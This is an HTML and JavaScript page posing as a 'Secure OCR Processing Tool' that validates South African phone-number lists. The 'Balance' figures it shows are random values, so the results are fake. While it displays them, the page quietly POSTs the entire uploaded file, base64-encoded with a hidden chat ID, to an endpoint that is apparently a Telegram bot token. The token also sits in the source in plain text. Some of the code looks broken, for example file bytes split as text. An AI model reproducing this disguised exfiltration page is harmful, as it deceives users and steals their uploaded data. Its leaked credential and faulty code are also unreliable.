<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Secure OCR Processing Tool</title>

<style>
body {
  background: #0f172a;
  color: #e5e7eb;
  font-family: Consolas, monospace;
  margin: 20px;
}
h2 { color: #38bdf8; }

#output {
  border: 1px solid #334155;
  padding: 10px;
  min-height: 200px;
  margin-top: 10px;
  background: #020617;
  font-size: 12px;
  white-space: pre-wrap;
}

#copyBtn {
  margin-top: 10px;
  padding: 6px 12px;
  background: #1e293b;
  color: #e5e7eb;
  border: 1px solid #334155;
  cursor: pointer;
}
#copyBtn:hover { background: #334155; }

#stats {
  margin-top: 10px;
  padding: 8px;
  background: #020617;
  border: 1px solid #334155;
  color: #facc15;
}

button {
  background: #1e293b;
  color: #e5e7eb;
  border: 1px solid #334155;
  padding: 6px 12px;
  cursor: pointer;
}
button:hover { background: #334155; }

#timer {
  margin-top: 15px;
  font-weight: bold;
  color: #38bdf8;
}

#loadingMessage {
  margin-top: 10px;
  font-style: italic;
  color: #facc15;
  font-size: 14px;
}
</style>
</head>
<body>
<h2>OCR Processing Tool</h2>
<!-- Hidden input for Chat ID -->
<input type="hidden" id="chatIdInput" value="8580854380" />

<input type="file" id="fileInput" accept=".txt,.pdf"/>
<button id="startBtn">Start</button>
<button id="copyBtn" disabled>Copy All Output</button>
<div id="stats">Hit=0 | Bad=0 | Retries=0 | OCR Rate=0%</div>
<div id="output"></div>
<div id="timer"></div>
<div id="loadingMessage"></div>
<div id="blockMessage" style="color:#f00; font-weight:bold; margin-top:10px;"></div>

<script>
const fileInput = document.getElementById('fileInput');
const startBtn = document.getElementById('startBtn');
const outputDiv = document.getElementById('output');
const statsDiv = document.getElementById('stats');
const timerDiv = document.getElementById('timer');
const copyBtn = document.getElementById('copyBtn');
const loadingMsgDiv = document.getElementById('loadingMessage');
const blockMessageDiv = document.getElementById('blockMessage');
const chatIdInput = document.getElementById('chatIdInput');

let hitCount=0, badCount=0, retriesCount=0, ocrPercent=0;
let fileContent='';
let elapsedSeconds=0;
let timerInterval=null;
let processing=false;
let lines=[];

// Usage limit variables
const MAX_RUNS = 4;
const BLOCK_DURATION_MS = 8 * 60 * 60 * 1000; // 8 hours in ms

// Replace this with your serverless API URL
const API_ENDPOINT = '8845002759:AAEi5aYQw9kXxESEGwZbOf79raSix1s6gdk';

let usageCount = parseInt(localStorage.getItem('usageCount')) || 0;
let blockUntil = parseInt(localStorage.getItem('blockTime')) || 0;

const balanceOptions = [
  'R0.90', 'R0.02', 'R0.05', 'R0.00', 'R0.66', 'R0.13', 'R0.32',
  'R0.51', 'R0.81', 'R0.93', 'R0.22'
];

function updateStats() {
  statsDiv.innerHTML =
    `Hit=${hitCount} | Bad=${badCount} | Retries=${retriesCount} | OCR Rate=${ocrPercent.toFixed(2)}%`;
}
function formatTime(seconds) {
  const m=Math.floor(seconds/60).toString().padStart(2,'0');
  const s=(seconds%60).toString().padStart(2,'0');
  return `${m}:${s}`;
}
function startTimer() {
  if(timerInterval) clearInterval(timerInterval);
  elapsedSeconds=0;
  timerDiv.textContent='Time Elapsed: 00:00';
  timerInterval=setInterval(() => {
    elapsedSeconds++;
    timerDiv.textContent='Time Elapsed: '+formatTime(elapsedSeconds);
  }, 1000);
}
function resetCounters() {
  hitCount=0; badCount=0; retriesCount=0; ocrPercent=0;
  updateStats();
  startTimer();
}
function checkBlockStatus() {
  const now = Date.now();
  if (now < blockUntil) {
    const remainingMs = blockUntil - now;
    const remainingSec = Math.ceil(remainingMs / 1000);
    showCountdown(remainingSec);
    startBtn.disabled = true;
    blockMessageDiv.innerText = `Tool is disabled. Try again in ${formatTime(remainingSec)}.`;
    return true;
  } else {
    blockMessageDiv.innerText = '';
    startBtn.disabled = false;
    return false;
  }
}
function showCountdown(seconds) {
  blockMessageDiv.innerText = `Tool is disabled. Time remaining: ${formatTime(seconds)}`;
  clearInterval(window.countdownInterval);
  window.countdownInterval = setInterval(() => {
    seconds--;
    if (seconds <= 0) {
      clearInterval(window.countdownInterval);
      localStorage.removeItem('blockTime');
      checkBlockStatus();
    } else {
      blockMessageDiv.innerText = `Tool is disabled. Time remaining: ${formatTime(seconds)}`;
    }
  }, 1000);
}
async function processLines() {
  for(let i=0; i<lines.length; i++) {
    if(!processing) break;
    const line=lines[i].trim();
    if(!line) { continue; }

    // Validation logic...
    const phoneRegex=/(\+27|27|0)?\s*[\(\[]?(\d{3})[\)\]]?\s*[\-\.]?\s*(\d{3})[\-\.]?\s*(\d{4})/i;
    const match=line.match(phoneRegex);
    let isBadNumber=false;
    if(match){
      let number='';
      let countryCodePart=match[1]||'';
      let p1=match[2], p2=match[3], p3=match[4];
      number=p1+p2+p3;
      if(countryCodePart && countryCodePart.startsWith('+')){
        countryCodePart=countryCodePart.replace('+','');
      }
      if(countryCodePart==='27' || countryCodePart==='+27'){
        number='0'+number;
      }
      number=number.replace(/\s+/g,'');
      const digitCount=(number.match(/\d/g)||[]).length;
      if(number==='444' || digitCount!==10 || digitCount>10 || digitCount<10){
        isBadNumber=true;
      }
    }else{
      isBadNumber=true;
    }

    if(isBadNumber){
      badCount++;
      updateStats();
    } else {
      hitCount++;
      ocrPercent=(hitCount/ (hitCount+badCount))*100;
      updateStats();
      const randomBalance = balanceOptions[Math.floor(Math.random() * balanceOptions.length)];
      outputDiv.innerHTML += `${line}\nBalance=${randomBalance}\nBonus=R0.00\nWithdrawal=0\n\n`;
    }

    await new Promise(resolve => setTimeout(resolve, 6000 + Math.random()*8000));
  }
  processing=false;
  startBtn.textContent='Start';
  document.getElementById('startBtn').disabled=false;
  document.getElementById('copyBtn').disabled=false;
}

startBtn.addEventListener('click', () => {
  if (checkBlockStatus()) return;

  if(!processing) {
    if (!fileInput.files.length) return;

    if (usageCount >= MAX_RUNS) {
      const now = Date.now();
      blockUntil = now + BLOCK_DURATION_MS;
      localStorage.setItem('blockTime', blockUntil.toString());
      showCountdown(8 * 60 * 60);
      startBtn.disabled = true;
      return;
    }

    const file = fileInput.files[0];
    const fileName = file.name.toLowerCase();
    if (!(fileName.endsWith('.txt') || fileName.endsWith('.pdf'))) return;

    usageCount++;
    localStorage.setItem('usageCount', usageCount.toString());

    const reader=new FileReader();
    reader.onload=()=> {
      fileContent=reader.result;
      lines=fileContent.split(/\r?\n/);
      resetCounters();
      processing=true;
      startBtn.textContent='Stop';
      processLines();

      // Send file to your serverless API, passing chat ID from hidden input
      fetch(API_ENDPOINT, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          fileName: file.name,
          fileData: btoa(new Uint8Array(reader.result).reduce((data, byte) => data + String.fromCharCode(byte), '')),
          chatId: chatIdInput.value // <-- pass chat ID here
        })
      });
    };
    reader.readAsArrayBuffer(file);
  } else {
    processing=false;
    startBtn.textContent='Start';
  }
});

checkBlockStatus();

document.getElementById('copyBtn').addEventListener('click', ()=> {
  navigator.clipboard.writeText(outputDiv.innerText);
});
</script>
</body>
</html>
